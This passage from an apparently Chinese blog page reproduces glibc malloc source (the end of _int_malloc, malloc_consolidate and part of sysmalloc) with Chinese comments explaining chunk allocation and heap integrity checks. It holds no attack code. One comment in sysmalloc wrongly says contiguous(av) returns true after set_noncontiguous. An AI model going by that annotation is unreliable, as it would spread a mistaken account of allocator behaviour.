(remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-comment">/* 设置好chunk的标志，并进行检测与初始化data的操作，然后将chunk返回给用户 */</span><br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    use_top:<br>      <span class="hljs-comment">/* 当上面的操作都无法获取chunk，则尝试通过分裂top chunk获取chunk */</span><br>      victim = av-&gt;top;<br>      size = chunksize (victim);<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br>        <span class="hljs-comment">/* 检测top chunk的大小是否过大，这种情况一般是top chunk的size被恶意修改了 */</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>        &#123; <span class="hljs-comment">/* 当top chunk分裂出用户申请的chunk之后还可以生成一个完整的chunk时 */</span><br>          remainder_size = size - nb;<br>          remainder = chunk_at_offset (victim, nb);<br>          av-&gt;top = remainder;<br>          set_head (victim, nb | PREV_INUSE |<br>                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>          set_head (remainder, remainder_size | PREV_INUSE);<br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim); <span class="hljs-comment">/* 获取chunk的data字段地址*/</span><br>          alloc_perturb (p, bytes);<br>          <span class="hljs-comment">/* 从top chunk分裂出chunk之后，为chunk设置头部，并进行安全检测与初始化data操作</span><br><span class="hljs-comment">             然后将chunk返回给用户 */</span><br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))<br>        &#123;<br>          malloc_consolidate (av);<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>            idx = smallbin_index (nb);<br>          <span class="hljs-keyword">else</span><br>            idx = largebin_index (nb);<br>          <span class="hljs-comment">/* 当fast bin中存在chunk时，合并fast bin中的chunk，并将合并后的chunk放入对应的bin中</span><br><span class="hljs-comment">              先获取符合用户申请的chunk的bin的编号，然后进入下一次循环 */</span><br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">/* 这种情况就是top chunk没有多余空间用来生成chunk</span><br><span class="hljs-comment">              且bin中也没有符合条件的chunk</span><br><span class="hljs-comment">              尝试使用 sysmalloc 从内存中申请空间</span><br><span class="hljs-comment">               如果原因处在top chunk过小，这个函数就会扩展top chunk */</span><br>          <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>          <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-comment">/* 将获取的chunk初始化后返回给用户*/</span><br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="malloc-consolidate">malloc_consolidate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;<br>  mfastbinptr*    maxfb;<br>  mchunkptr       p;<br>  mchunkptr       nextp;<br>  mchunkptr       unsorted_bin;<br>  mchunkptr       first_unsorted;<br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>  unsorted_bin = unsorted_chunks(av);<br>  maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>  fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">do</span> &#123;<br>      <span class="hljs-comment">/* 遍历所有fast bin */</span><br>    p = atomic_exchange_acq (fb, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">/* 获取bin中第一个成员*/</span><br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">do</span> &#123;<br>  &#123;  <span class="hljs-comment">/* 如果bin中没有成员则跳过 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index (chunksize (p));<br>    <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>      malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>        <span class="hljs-comment">/* 如果获取到的chunk的size不属于当前bin，则表示chunk被修改过了 */</span><br>  &#125;<br>  check_inuse_chunk(av, p); <span class="hljs-comment">/* 检测当前chunk及其附近的chunk的大小和inuse位是否合法 */</span><br>  nextp = p-&gt;fd;  <span class="hljs-comment">/* 获取fast bin中下一个成员，为下一次循环做准备 */</span><br>  size = chunksize (p);<br>  nextchunk = chunk_at_offset(p, size);<br>  nextsize = chunksize(nextchunk);<br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      <span class="hljs-comment">/* 当当前chunk的inuse位为0时，表示前一个chunk属于空闲状态</span><br><span class="hljs-comment">          合并两个chunk */</span><br>    prevsize = prev_size (p);<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-comment">/* 如果当前chunk的prev_size字段不等于 前一个chunk的size字段，则表示当前chunk被恶意     修改过了*/</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);<br>    unlink_chunk (av, p);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">/* 确保后一个chunk不是top chunk，如果是就直接与top chunk合并  */</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>      size += nextsize;<br>      unlink_chunk (av, nextchunk);<br>        <span class="hljs-comment">/* 如果后一个chunk当前为空闲状态，则将其从所在bin中取出 */</span><br>    &#125; <span class="hljs-keyword">else</span><br>      clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>    first_unsorted = unsorted_bin-&gt;fd;<br>    unsorted_bin-&gt;fd = p;<br>    first_unsorted-&gt;bk = p;<br>    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>      p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>      p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    set_head(p, size | PREV_INUSE);<br>    p-&gt;bk = unsorted_bin;<br>    p-&gt;fd = first_unsorted;<br>    set_foot(p, size);<br>      <span class="hljs-comment">/* 设置好合并后的chunk头部，并将合并后的chunk放入unsorted bin中 */</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>  &#125;<br>      &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="sysmalloc">sysmalloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">sysmalloc</span> <span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span><br>&#123;<br>  mchunkptr old_top;<br>  INTERNAL_SIZE_T old_size;<br>  <span class="hljs-type">char</span> *old_end;<br>  <span class="hljs-type">long</span> size;<br>  <span class="hljs-type">char</span> *brk;<br>  <span class="hljs-type">long</span> correction;<br>  <span class="hljs-type">char</span> *snd_brk;<br>  INTERNAL_SIZE_T front_misalign;<br>  INTERNAL_SIZE_T end_misalign;<br>  <span class="hljs-type">char</span> *aligned_brk;<br>  mchunkptr p;<br>  mchunkptr remainder;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;<br>  <span class="hljs-type">size_t</span> pagesize = GLRO (dl_pagesize);<br>  <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br>    &#123; <span class="hljs-comment">/* 如果分配区为空或 </span><br><span class="hljs-comment">          用户创建的chunk符合mmap的条件且使用mmap创建的chunk数量没到最大值 </span><br><span class="hljs-comment">          通过mmap创建chunk*/</span><br>      <span class="hljs-type">char</span> *mm;<br>    try_mmap:<br>      <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>        size = ALIGN_UP (nb + SIZE_SZ, pagesize);<br>      <span class="hljs-keyword">else</span><br>        size = ALIGN_UP (nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>      <span class="hljs-comment">/* 获取用户申请的大小关于 pagesize 对齐后的结果 */</span><br>      tried_mmap = <span class="hljs-literal">true</span>;<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>        &#123;<br>          mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br>          <span class="hljs-comment">/* 使用MMAP函数分配空间 */</span><br>          <span class="hljs-keyword">if</span> (mm != MAP_FAILED)<br>            &#123; <span class="hljs-comment">/* 当空间分配成功时 */</span><br>              <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                &#123;<br>                  assert (((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                  front_misalign = <span class="hljs-number">0</span>;<br>                  <span class="hljs-comment">/* 检测空间地址是否对齐，因为MALLOC_ALIGNMENT==2*SIZE_SZ</span><br><span class="hljs-comment">                    所以空间必定对齐，如果没有对齐就是程序存在错误 */</span><br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                front_misalign = (INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;<br>                <span class="hljs-comment">/* 获取没有对齐的那部分大小 */</span><br>              <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                &#123;<br>                  correction = MALLOC_ALIGNMENT - front_misalign;<br>                  p = (mchunkptr) (mm + correction);<br>  set_prev_size (p, correction);<br>                  <span class="hljs-comment">/* 对齐空间并设置头部 */</span><br>                  set_head (p, (size - correction) | IS_MMAPPED);<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  p = (mchunkptr) mm;<br>  set_prev_size (p, <span class="hljs-number">0</span>);<br>                  set_head (p, size | IS_MMAPPED);<br>                &#125;<br>              <span class="hljs-type">int</span> new = atomic_exchange_and_add (&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_n_mmaps, new);<br>              <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>              sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;<br>              <span class="hljs-type">atomic_max</span> (&amp;mp_.max_mmapped_mem, sum);<br>              <span class="hljs-comment">/* 更新 由mmap分配的空间个数 与 空间大小 */</span><br><br>              check_chunk (av, p); <span class="hljs-comment">/* 检测chunk的地址是否合法 */</span><br>              <span class="hljs-keyword">return</span> chunk2mem (p);<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>      <span class="hljs-comment">/* 因为上面尝试了使用mmap创建chunk，而分配区为空又不能为分配区扩展top chunk</span><br><span class="hljs-comment">          所以没有办法创建chunk了，这时就返回 0 表示分配失败 */</span><br><br>  old_top = av-&gt;top;<br>  old_size = chunksize (old_top);<br>  old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br>  brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br>  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>          ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>           prev_inuse (old_top) &amp;&amp;<br>           ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br>        <span class="hljs-comment">/*先获取 当前分配区正在使用的top chunk的地址，大小，结尾地址， 和 当前内存使用到的空间的尾地址</span><br><span class="hljs-comment">          到达这里只有两种可能</span><br><span class="hljs-comment">            1. 这是第一次申请chunk</span><br><span class="hljs-comment">            2. top chunk的空间不够 用户申请的chunk使用 </span><br><span class="hljs-comment">           因为top chunk在创建时与 pagesize 对齐过了，</span><br><span class="hljs-comment">           如果top chunk的结尾无法对齐pagesize</span><br><span class="hljs-comment">           则表示top chunk被修改过了*/</span><br>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    &#123; <span class="hljs-comment">/* 当 当前不是主分配区时 */</span><br>      heap_info *old_heap, *heap;<br>      <span class="hljs-type">size_t</span> old_heap_size;<br>      old_heap = heap_for_ptr (old_top);<br>      old_heap_size = old_heap-&gt;size;<br>      <span class="hljs-comment">/* 先获取当前分配区中关于堆段的信息 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        正常情况下在执行到这个位置可能的原因有:</span><br><span class="hljs-comment">          一、top chunk无法分裂出用户申请的chunk与一个最小chunk</span><br><span class="hljs-comment">          二、初始化分配区</span><br><span class="hljs-comment">      */</span><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="hljs-number">0</span><br>          &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">/* 尝试扩展heap段，如果扩展成功，则更新top chunk的size 与 当前占用内存空间大小*/</span><br>          av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>          set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)<br>                    | PREV_INUSE);<br><br>        &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap (nb + (MINSIZE + <span class="hljs-keyword">sizeof</span> (*heap)), mp_.top_pad)))<br>        &#123;  <span class="hljs-comment">/*   </span><br><span class="hljs-comment">              在初始化分配区，或者扩展heap失败时，尝试创建新的heap段</span><br><span class="hljs-comment">                设置新的top chuk</span><br><span class="hljs-comment">                并释放旧的top chunk*/</span><br>          heap-&gt;ar_ptr = av;<br>          heap-&gt;prev = old_heap;<br>          av-&gt;system_mem += heap-&gt;size;<br>          top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span> (*heap));<br>          set_head (top (av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span> (*heap)) | PREV_INUSE);<br>          old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;<br>          set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | PREV_INUSE);<br>          <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>            &#123;<br>              set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>              set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br>              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br>              _int_free (av, old_top, <span class="hljs-number">1</span>);<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              set_head (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>              set_foot (old_top, (old_size + <span class="hljs-number">2</span> * SIZE_SZ));<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!tried_mmap)<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          当还没有尝试过使用mmap分配空间</span><br><span class="hljs-comment">          则使用mmap尝试创建chunk</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-keyword">goto</span> try_mmap; <br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* 主分配区 */</span><br>      size = nb + mp_.top_pad + MINSIZE;<br>      <span class="hljs-keyword">if</span> (contiguous (av)) <br>      <span class="hljs-comment">/* 当程序不允许在同一分配区出现不连续的空间时</span><br><span class="hljs-comment">          设置size为需要增加的字节数量 */</span><br>        size -= old_size;<br>      size = ALIGN_UP (size, pagesize); <span class="hljs-comment">// 对齐size</span><br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)<br>        &#123; <span class="hljs-comment">// 当size大于0时，尝试使用MORECORE分配空间</span><br>          brk = (<span class="hljs-type">char</span> *) (MORECORE (size));<br>          LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123; <span class="hljs-comment">/*</span><br><span class="hljs-comment">               当使用了MORECORE分配空间</span><br><span class="hljs-comment">               且分配成功时</span><br><span class="hljs-comment">          */</span><br>          <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>          <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>            <span class="hljs-comment">/* 调用__after_morecore_hook中储存的函数地址</span><br><span class="hljs-comment">            */</span><br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-keyword">if</span> (contiguous (av))<br>            <span class="hljs-comment">/* 修改size，并对齐 */</span><br>            size = ALIGN_UP (size + old_size, pagesize);<br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>            <span class="hljs-comment">/* 指定使用mmap从内存中分配chunk的最小size */</span><br>            size = MMAP_AS_MORECORE_SIZE; <br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br>              <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)<br>                &#123;<br><br>                  brk = mbrk;<br>                  snd_brk = brk + size;<br>                  set_noncontiguous (av);<br>                  <span class="hljs-comment">// 当mmap分配成功时，更新内存使用信息</span><br>                  <span class="hljs-comment">// 并修改当前分配区的continguous信息</span><br>                  <span class="hljs-comment">// 之后再执行 continguos(av) 时会返回真</span><br>                &#125;<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123;<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">            当前面的代码分配空间成功时</span><br><span class="hljs-comment">          */</span><br>          <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>            mp_.sbrk_base = brk;<br>          av-&gt;system_mem += size;<br>          <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) 